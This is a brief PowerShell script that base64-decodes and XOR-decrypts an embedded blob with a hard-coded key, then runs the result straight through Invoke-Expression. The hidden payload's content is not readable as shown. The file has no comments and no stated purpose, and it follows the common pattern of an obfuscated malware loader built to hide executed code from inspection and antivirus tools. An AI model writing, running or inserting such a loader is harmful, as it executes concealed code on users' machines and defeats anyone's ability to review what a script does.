function Decrypt-String {
    param ([string]$EncryptedString, [string]$Key)
    $encryptedBytes = [Convert]::FromBase64String($EncryptedString)
    $decryptedChars = @()
    for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
        $decryptedChars += [char]($encryptedBytes[$i] -bxor [byte][char]$Key[$i % $Key.Length])
    }
    return -join $decryptedChars
}

$encryptedScript = "SQl/TlUrNgssBwAOXCw7cTsEDTc7VUgcCgMGHwcXXVc6X0QJdSg0D19VVwAcOwUMEQcWWjoTAF52XU87MRMBDxNEIBAAK3xXR0kCHX9eIAIMUngbERcCFk5wRBcYKEgIGysNGwYDGhcHEDBfRlZPGVc8HBhfMB89AQAPHgQnNwQSSHAoCgA6Fho0NUYAEBUsHlpWQAkKcB4UGQtdOh0BFRsXASxFAAE6QU9fEBAaIh8FF1VXLwoSYFUMCyteJQIKEToAFkNWFQ=="
$key = "my_super_secret_key_for_endvirus_123!"

$decryptedScript = Decrypt-String -EncryptedString $encryptedScript -Key $key
Invoke-Expression $decryptedScript
